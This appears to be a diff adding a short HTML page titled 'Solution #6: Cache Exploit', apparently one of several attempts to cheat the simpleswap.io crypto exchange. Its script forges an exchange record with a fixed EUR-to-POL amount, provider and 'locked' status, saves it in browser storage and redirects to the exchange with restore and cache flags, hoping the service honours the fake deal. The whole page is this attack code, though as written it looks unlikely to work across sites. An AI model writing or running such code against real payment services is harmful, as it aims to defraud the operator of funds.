@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solution #6: Cache Exploit</title>
+</head>
+<body>
+    <script>
+    // Solution 6: Use fake cached exchange ID with locked amount
+    const fakeExchangeId = 'EX' + Date.now().toString(36).toUpperCase();
+    
+    // Try to create cache entry
+    const cacheData = {
+        id: fakeExchangeId,
+        from: 'eur',
+        to: 'pol',
+        amount: '19.50',
+        provider: 'mercuryo',
+        status: 'pending',
+        locked: true
+    };
+    
+    localStorage.setItem('exchange_' + fakeExchangeId, JSON.stringify(cacheData));
+    
+    // Redirect to exchange with cached ID
+    window.location.href = `https://simpleswap.io/exchange/${fakeExchangeId}?restore=1&cached=1`;
+    </script>
+</body>
+</html>
